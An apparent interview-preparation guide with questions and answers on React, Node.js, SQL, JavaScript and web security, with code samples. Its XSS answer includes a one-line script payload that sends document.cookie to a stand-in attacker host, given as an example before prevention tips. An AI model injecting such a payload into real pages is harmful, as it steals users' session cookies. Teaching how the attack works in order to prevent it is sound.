# 🎯 SDE-1 Interview Questions & Answers

Common interview questions with detailed answers for Full Stack, Frontend, and Backend roles.

---

## 🔴 React.js Questions

### Q1: Explain the Virtual DOM and how React uses it.
**Answer:**
The Virtual DOM is a lightweight JavaScript representation of the actual DOM. When state changes:
1. React creates a new Virtual DOM tree
2. Compares it with the previous Virtual DOM (Diffing)
3. Calculates the minimal set of changes needed (Reconciliation)
4. Updates only those parts in the real DOM (Batching)

**Why it's faster:** Direct DOM manipulation is expensive. React minimizes these operations by batching updates and only touching what changed.

---

### Q2: What is the difference between `useMemo` and `useCallback`?
**Answer:**
- **`useMemo`**: Returns and caches a **memoized value**
  ```javascript
  const expensiveValue = useMemo(() => computeExpensive(a, b), [a, b]);
  ```
  Use when you have expensive calculations.

- **`useCallback`**: Returns and caches a **memoized function**
  ```javascript
  const handleClick = useCallback(() => { doSomething(a) }, [a]);
  ```
  Use when passing functions to child components to prevent unnecessary re-renders.

**Key Difference:** `useMemo(() => fn)` is equivalent to `useCallback(fn)`.

---

### Q3: What causes a re-render in React?
**Answer:**
A component re-renders when:
1. Its **state** changes (`setState`)
2. Its **props** change
3. Its **parent** re-renders (unless wrapped with `React.memo`)
4. **Context** value changes (if the component consumes it)

---

### Q4: Explain React's reconciliation algorithm.
**Answer:**
React uses a **Fiber architecture** for reconciliation:
- Compares elements by **type** first (e.g., `<div>` vs `<span>`)
- If types differ, destroys old tree and builds new one
- If types match, updates only changed attributes
- Uses **keys** to identify elements in lists and minimize re-ordering

---

### Q5: What is prop drilling and how do you solve it?
**Answer:**
**Problem:** Passing props through multiple intermediate components that don't need them.

**Solutions:**
1. **Context API** - For global state (theme, auth)
2. **Component Composition** - Pass components as children
3. **State Management** - Redux, Zustand for complex state

---

### Q6: When would you use `useLayoutEffect` instead of `useEffect`?
**Answer:**
- **`useEffect`**: Runs **after** the browser paints
- **`useLayoutEffect`**: Runs **before** the browser paints (synchronously)

Use `useLayoutEffect` when you need to:
- Measure DOM elements
- Make visual changes that should be visible immediately
- Avoid visual flickering

**Warning:** Overuse can cause performance issues.

---

### Q7: `useState` vs `useReducer` - When to use which?
**Answer:**
**`useState`**: For simple, independent state
```javascript
const [count, setCount] = useState(0);
```

**`useReducer`**: For complex state logic with multiple sub-values or when next state depends on previous
```javascript
const [state, dispatch] = useReducer(reducer, initialState);

function reducer(state, action) {
  switch (action.type) {
    case 'increment': return { count: state.count + 1 };
    case 'decrement': return { count: state.count - 1 };
    default: return state;
  }
}
```

**Use `useReducer` when:**
- State has complex nested structure
- Multiple ways to update state
- Need to pass dispatch to children (instead of multiple callbacks)

---

### Q8: How do you create a custom hook?
**Answer:**
Custom hooks let you extract reusable stateful logic. Must start with "use".

```javascript
// useFetch custom hook
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(data => {
        setData(data);
        setLoading(false);
      })
      .catch(err => {
        setError(err);
        setLoading(false);
      });
  }, [url]);

  return { data, loading, error };
}

// Usage
function Component() {
  const { data, loading, error } = useFetch('/api/users');
}
```

---

### Q9: Explain code splitting and lazy loading in React.
**Answer:**
**Code Splitting**: Breaking your bundle into smaller chunks that are loaded on-demand.

```javascript
// Without code splitting - all loaded at once
import HeavyComponent from './HeavyComponent';

// With code splitting - loaded when needed
const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}
```

**Benefits:**
- Faster initial load time
- Better performance
- Load features only when user needs them

---

### Q10: What are Error Boundaries and how do they work?
**Answer:**
Error Boundaries catch JavaScript errors in component tree and display fallback UI.

```javascript
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
    console.log('Error:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return <h1>Something went wrong.</h1>;
    }
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <MyComponent />
</ErrorBoundary>
```

**Note:** Error boundaries don't catch errors in:
- Event handlers (use try-catch)
- Async code (setTimeout)
- Server-side rendering
- Errors in the error boundary itself

---

## 🟢 Node.js & Backend Questions

### Q7: Explain the Event Loop in Node.js.
**Answer:**
The Event Loop allows Node.js to perform non-blocking I/O despite being single-threaded.

**Execution Order:**
1. **Call Stack** - Executes synchronous code
2. **Microtasks** - `process.nextTick()`, Promises (highest priority)
3. **Macrotasks** - `setTimeout`, `setInterval`, I/O callbacks

```javascript
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
console.log('4');
// Output: 1, 4, 3, 2
```

---

### Q8: What is middleware in Express? Give examples.
**Answer:**
Functions with access to `req`, `res`, and `next()` that process requests before reaching route handlers.

**Types:**
```javascript
// 1. Application-level
app.use(express.json()); // Parse JSON bodies

// 2. Custom middleware
app.use((req, res, next) => {
  console.log(req.method, req.url);
  next();
});

// 3. Error-handling (must have 4 parameters)
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: err.message });
});
```

---

### Q9: How does Node.js handle concurrency if it's single-threaded?
**Answer:**
- **Single-threaded** for JavaScript execution
- Uses **libuv** library to delegate I/O operations to the OS kernel
- OS uses threads/async I/O to handle operations
- Callbacks are queued and executed when operations complete
- Result: Non-blocking I/O without JavaScript-level threading

---

### Q10: What's the difference between `process.nextTick()` and `setImmediate()`?
**Answer:**
```javascript
setImmediate(() => console.log('setImmediate'));
process.nextTick(() => console.log('nextTick'));
// Output: nextTick, setImmediate
```

- **`process.nextTick()`**: Executes before the Event Loop continues (before I/O)
- **`setImmediate()`**: Executes in the Check phase (after I/O)

**Use `nextTick` cautiously** - it can starve the Event Loop if used recursively.

---

### Q11: How do you handle errors in async/await?
**Answer:**
```javascript
// Method 1: try-catch
app.get('/users', async (req, res, next) => {
  try {
    const users = await db.getUsers();
    res.json(users);
  } catch (error) {
    next(error); // Pass to error middleware
  }
});

// Method 2: Wrapper function
const asyncHandler = (fn) => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next);
};

app.get('/users', asyncHandler(async (req, res) => {
  const users = await db.getUsers();
  res.json(users);
}));
```

---

### Q12: What are Streams in Node.js? When would you use them?
**Answer:**
Streams process data piece by piece instead of loading everything into memory.

**Types:**
- **Readable**: Read data (file, HTTP request)
- **Writable**: Write data (file, HTTP response)
- **Duplex**: Both read and write (TCP socket)
- **Transform**: Modify data while reading/writing (compression)

```javascript
const fs = require('fs');

// Bad: Loads entire file into memory
const data = fs.readFileSync('huge-file.txt');

// Good: Streams data in chunks
const readStream = fs.createReadStream('huge-file.txt');
readStream.pipe(process.stdout);

// Example: File upload
app.post('/upload', (req, res) => {
  const writeStream = fs.createWriteStream('uploaded-file.pdf');
  req.pipe(writeStream);
  writeStream.on('finish', () => res.send('Upload complete'));
});
```

**Use streams for:**
- Large files
- Real-time data processing
- Memory efficiency

---

### Q13: How does clustering work in Node.js?
**Answer:**
Clustering allows you to create child processes (workers) that share the same server port, utilizing all CPU cores.

```javascript
const cluster = require('cluster');
const os = require('os');
const express = require('express');

if (cluster.isMaster) {
  const numCPUs = os.cpus().length;
  console.log(`Master process ${process.pid} is running`);
  
  // Fork workers
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died, starting new one`);
    cluster.fork();
  });
} else {
  const app = express();
  app.get('/', (req, res) => res.send(`Worker ${process.pid}`));
  app.listen(3000);
}
```

**Benefits:**
- Utilize all CPU cores
- Better fault tolerance (if one worker crashes, others continue)
- Load balancing handled by OS

---

### Q14: What are WebSockets and when would you use them?
**Answer:**
WebSockets provide **full-duplex** communication between client and server (both can send messages anytime).

**HTTP vs WebSocket:**
- **HTTP**: Request-response, client initiates, connection closes after response
- **WebSocket**: Persistent connection, bidirectional, real-time

```javascript
// Server (using ws library)
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    console.log('received:', message);
    ws.send('Echo: ' + message);
  });
});

// Client
const socket = new WebSocket('ws://localhost:8080');
socket.onmessage = (event) => console.log(event.data);
socket.send('Hello Server!');
```

**Use cases:**
- Chat applications
- Live notifications
- Real-time dashboards
- Online gaming

---

### Q15: How do you handle file uploads securely?
**Answer:**
```javascript
const multer = require('multer');
const path = require('path');

// Configure storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  }
});

// File filter (security)
const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

const upload = multer({ 
  storage,
  fileFilter,
  limits: { fileSize: 5 * 1024 * 1024 } // 5MB
});

app.post('/upload', upload.single('file'), (req, res) => {
  res.json({ filename: req.file.filename });
});
```

**Security best practices:**
- Validate file type (check magic numbers, not just extension)
- Limit file size
- Store files outside web root
- Use cloud storage (S3, Cloudinary) for production
- Scan for malware
- Generate random filenames

---

## 🗄️ Database Questions

### Q12: Explain ACID properties with a real-world example.
**Answer:**
**Example: Bank Transfer ($100 from A to B)**

- **Atomicity**: Both debit and credit happen together or not at all. No partial transfer.
- **Consistency**: Total money in the system remains constant ($1000 before = $1000 after).
- **Isolation**: If another transaction checks balances during transfer, it sees either before or after state, not intermediate.
- **Durability**: Once committed, even if server crashes, the transfer is permanent.

---

### Q13: What's the difference between `DELETE`, `TRUNCATE`, and `DROP`?
**Answer:**
| Command | Type | Action | Rollback | Speed |
|---------|------|--------|----------|-------|
| `DELETE` | DML | Removes rows (with `WHERE`) | Yes | Slow |
| `TRUNCATE` | DDL | Removes all rows, resets identity | No* | Fast |
| `DROP` | DDL | Deletes table structure + data | No | Instant |

*Some databases allow rollback within transaction

---

### Q14: Explain different types of JOINs with examples.
**Answer:**
```sql
-- Tables: users(id, name), orders(id, user_id, amount)

-- INNER JOIN: Only matching records
SELECT u.name, o.amount 
FROM users u 
INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN: All from left + matching from right
SELECT u.name, o.amount 
FROM users u 
LEFT JOIN orders o ON u.id = o.user_id;
-- Shows all users, NULL for users without orders

-- RIGHT JOIN: All from right + matching from left
-- (Opposite of LEFT JOIN)

-- FULL OUTER JOIN: All records from both tables
-- Shows all users and all orders, with NULLs where no match
```

---

### Q15: What is Database Normalization? Explain up to 3NF.
**Answer:**
Process of organizing data to reduce redundancy and improve integrity.

**1NF (First Normal Form):**
- Atomic values (no arrays/lists in a cell)
- Each column has a unique name
- Order doesn't matter

**2NF:**
- 1NF + No partial dependency
- All non-key attributes depend on the **full primary key**

**3NF:**
- 2NF + No transitive dependency
- Non-key attributes depend only on the primary key, not on other non-key attributes

---

### Q16: Indexing - When to use and when not to use?
**Answer:**
**Use indexes when:**
- Frequent `WHERE` clause searches on a column
- Joining tables on a column
- Sorting/ordering by a column

**Avoid indexes when:**
- Small tables (overhead > benefit)
- Columns with frequent `INSERT`/`UPDATE`/`DELETE`
- Low selectivity columns (e.g., boolean fields with 50/50 distribution)

**Trade-off:** Faster reads, slower writes (index needs updating).

---

### Q17: What is the N+1 Query Problem? How do you solve it?
**Answer:**
**Problem:** Making N additional queries to fetch related data for N items.

```javascript
// BAD: N+1 queries
const users = await User.findAll(); // 1 query
for (let user of users) {
  user.posts = await Post.findAll({ where: { userId: user.id } }); // N queries
}
// Total: 1 + N queries

// GOOD: 2 queries using JOIN or eager loading
const users = await User.findAll({
  include: [Post] // 1 query with JOIN
});
// Total: 1 query
```

**Solutions:**
- Use JOINs in SQL
- Eager loading (ORM feature)
- DataLoader (batching and caching)

---

### Q18: Explain Database Transactions with an example.
**Answer:**
A transaction is a sequence of operations performed as a single logical unit of work.

```javascript
// Example: Bank transfer
const db = await getConnection();

try {
  await db.query('BEGIN'); // Start transaction
  
  // Deduct from account A
  await db.query('UPDATE accounts SET balance = balance - 100 WHERE id = 1');
  
  // Add to account B
  await db.query('UPDATE accounts SET balance = balance + 100 WHERE id = 2');
  
  await db.query('COMMIT'); // Commit if both succeed
} catch (error) {
  await db.query('ROLLBACK'); // Rollback if any fails
  throw error;
}
```

**Benefits:**
- All operations succeed or all fail (Atomicity)
- Prevents partial updates
- Maintains data consistency

---

### Q19: What is Database Connection Pooling?
**Answer:**
**Problem:** Creating a new database connection for each request is expensive (CPU, memory, time).

**Solution:** Connection pooling maintains a pool of reusable database connections.

```javascript
const { Pool } = require('pg');

const pool = new Pool({
  host: 'localhost',
  database: 'mydb',
  max: 20, // Maximum connections
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// Use connection from pool
app.get('/users', async (req, res) => {
  const client = await pool.connect();
  try {
    const result = await client.query('SELECT * FROM users');
    res.json(result.rows);
  } finally {
    client.release(); // Return to pool
  }
});
```

**Benefits:**
- Faster response times (connections are pre-created)
- Limits total connections to database
- Reuses connections efficiently

---

### Q20: SQL vs NoSQL - When to use which?
**Answer:**
**Use SQL (MySQL, PostgreSQL) when:**
- Complex relationships and JOINs
- ACID compliance required (banking, e-commerce)
- Structured data with fixed schema
- Strong consistency needed

**Use NoSQL (MongoDB, Redis) when:**
- Flexible/dynamic schema
- Horizontal scaling needed
- High write throughput
- Document/key-value data model fits better
- Eventual consistency is acceptable

**Example use cases:**
- **SQL**: Banking systems, inventory management, HR systems
- **NoSQL**: Social media feeds, real-time analytics, chat apps, caching

---

## 🧠 JavaScript Fundamentals

### Q21: Explain Closures with a practical example.
**Answer:**
A closure is when a function "remembers" variables from its outer scope even after the outer function has returned.

```javascript
function createCounter() {
  let count = 0; // Private variable
  
  return {
    increment: function() {
      count++;
      return count;
    },
    decrement: function() {
      count--;
      return count;
    },
    getCount: function() {
      return count;
    }
  };
}

const counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2
console.log(counter.getCount());  // 2
console.log(count); // ReferenceError: count is not defined
```

**Practical uses:**
- Data privacy (encapsulation)
- Factory functions
- Event handlers
- Callbacks

---

### Q22: Debouncing vs Throttling - Explain with examples.
**Answer:**
Both limit function execution frequency, but differently.

**Debouncing:** Delays execution until user stops triggering the event for N milliseconds.
```javascript
function debounce(func, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(this, args), delay);
  };
}

// Use case: Search bar
const searchAPI = debounce((query) => {
  fetch(`/api/search?q=${query}`);
}, 300);

input.addEventListener('input', (e) => searchAPI(e.target.value));
// API called only 300ms after user stops typing
```

**Throttling:** Ensures function executes at most once per N milliseconds.
```javascript
function throttle(func, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      func.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

// Use case: Scroll event
const handleScroll = throttle(() => {
  console.log('Scroll position:', window.scrollY);
}, 1000);

window.addEventListener('scroll', handleScroll);
// Logs at most once per second
```

---

### Q23: Explain `call`, `apply`, and `bind`.
**Answer:**
All three methods set the `this` value of a function.

```javascript
const person = { name: 'Alice' };

function greet(greeting, punctuation) {
  console.log(`${greeting}, ${this.name}${punctuation}`);
}

// call: Invoke immediately, pass args individually
greet.call(person, 'Hello', '!'); // "Hello, Alice!"

// apply: Invoke immediately, pass args as array
greet.apply(person, ['Hi', '.']); // "Hi, Alice."

// bind: Returns new function with 'this' bound (not invoked)
const greetAlice = greet.bind(person);
greetAlice('Hey', '!!'); // "Hey, Alice!!"

// Partial application with bind
const greetAliceHello = greet.bind(person, 'Hello');
greetAliceHello('!!!'); // "Hello, Alice!!!"
```

**Key Difference:**
- `call/apply`: Execute immediately
- `bind`: Returns a new function

---

### Q24: What is Prototypal Inheritance?
**Answer:**
JavaScript uses prototypes for inheritance, not classes (classes are syntactic sugar).

```javascript
// Constructor function
function Animal(name) {
  this.name = name;
}

Animal.prototype.speak = function() {
  console.log(`${this.name} makes a sound`);
};

function Dog(name, breed) {
  Animal.call(this, name); // Call parent constructor
  this.breed = breed;
}

// Inherit from Animal
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

Dog.prototype.bark = function() {
  console.log(`${this.name} barks!`);
};

const dog = new Dog('Buddy', 'Golden Retriever');
dog.speak(); // "Buddy makes a sound" (inherited)
dog.bark();  // "Buddy barks!" (own method)
```

**Prototype Chain:**
```
dog -> Dog.prototype -> Animal.prototype -> Object.prototype -> null
```

---

## 🌐 Full Stack & System Design

### Q17: Explain the difference between Authentication and Authorization.
**Answer:**
- **Authentication (AuthN)**: *"Who are you?"*
  - Login with username/password
  - Verifies identity
  - Example: JWT token generated after login

- **Authorization (AuthZ)**: *"What can you do?"*
  - Checks permissions/roles
  - Happens after authentication
  - Example: Admin can delete users, regular users cannot

---

### Q18: How does JWT authentication work?
**Answer:**
**Flow:**
1. User logs in with credentials
2. Server verifies, creates JWT (Header + Payload + Signature)
3. Server signs with secret key and sends to client
4. Client stores JWT (localStorage/cookie)
5. Client sends JWT in `Authorization: Bearer <token>` header
6. Server verifies signature, decodes payload
7. Server grants/denies access based on payload data

**Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    // Header
eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ. // Payload (base64)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c    // Signature
```

---

### Q19: What is CORS and how do you handle it?
**Answer:**
**Problem:** Browsers block requests from `http://localhost:3000` to `http://api.example.com` for security.

**Solution:**
```javascript
// Server-side (Express)
const cors = require('cors');

// Allow all origins
app.use(cors());

// Allow specific origin
app.use(cors({
  origin: 'http://localhost:3000',
  credentials: true
}));

// Manual setup
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
```

---

### Q20: Explain XSS (Cross-Site Scripting) attack and prevention.
**Answer:**
**Attack:** Injecting malicious JavaScript into a website that executes in other users' browsers.

**Example:**
```javascript
// User submits comment:
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

// If rendered as HTML, steals cookies from all viewers
```

**Prevention:**
1. **Sanitize inputs** - Strip/escape HTML tags
2. **Use frameworks** - React auto-escapes JSX content
3. **Content Security Policy (CSP)** - HTTP header restricting script sources
4. **HttpOnly cookies** - Prevents JavaScript access

---

### Q21: How would you scale a web application?
**Answer:**
**Horizontal Scaling:**
1. **Load Balancers** - Distribute traffic across multiple servers (Nginx, AWS ALB)
2. **Database Replication** - Master-slave setup for read-heavy apps
3. **Caching** - Redis/Memcached for frequent queries
4. **CDN** - Serve static assets from edge locations
5. **Microservices** - Split monolith into independent services

**Vertical Scaling:**
- Add more CPU/RAM to existing servers (limited, expensive)

**Database Optimization:**
- Indexing frequently queried columns
- Query optimization (avoid N+1 queries)
- Database sharding (partition data across servers)

---

### Q22: REST API best practices?
**Answer:**
1. **Use HTTP methods correctly**
   - `GET` - Read (no body)
   - `POST` - Create
   - `PUT` - Full update
   - `PATCH` - Partial update
   - `DELETE` - Remove

2. **Proper status codes**
   - `200` - Success
   - `201` - Created
   - `400` - Bad request
   - `401` - Unauthorized
   - `404` - Not found

3. **Versioning**
   - `/api/v1/users`

4. **Pagination**
   - `/api/users?page=2&limit=20`

5. **Error responses**
   ```json
   {
     "error": {
       "code": "VALIDATION_ERROR",
       "message": "Email is required"
     }
   }
   ```

---

## 💡 Behavioral & Scenario Questions

### Q23: How do you debug a production issue?
**Answer:**
1. **Reproduce** - Try to replicate locally/staging
2. **Check Logs** - Server logs, error tracking (Sentry)
3. **Monitor** - APM tools (New Relic, DataDog)
4. **Isolate** - Binary search approach, disable features
5. **Fix & Test** - Write tests to prevent regression
6. **Deploy** - Gradual rollout, monitor metrics

---

### Q24: Describe a challenging bug you've fixed.
**Answer:** *(Prepare your own example, but structure it like this)*
**STAR Method:**
- **Situation**: Project had race condition causing duplicate orders
- **Task**: Debug and fix without breaking existing functionality
- **Action**: Added transaction locks, implemented idempotency keys
- **Result**: Zero duplicates, added integration tests

---

## 📚 Quick Reference

### Must-Know Topics Checklist
- ✅ React Hooks (`useState`, `useEffect`, `useMemo`, `useCallback`)
- ✅ Event Loop & Async JavaScript
- ✅ Express Middleware & Error Handling
- ✅ SQL JOINs & Indexing
- ✅ Authentication (JWT, Sessions)
- ✅ REST API Design
- ✅ CORS, XSS, CSRF
- ✅ HTTP Methods & Status Codes
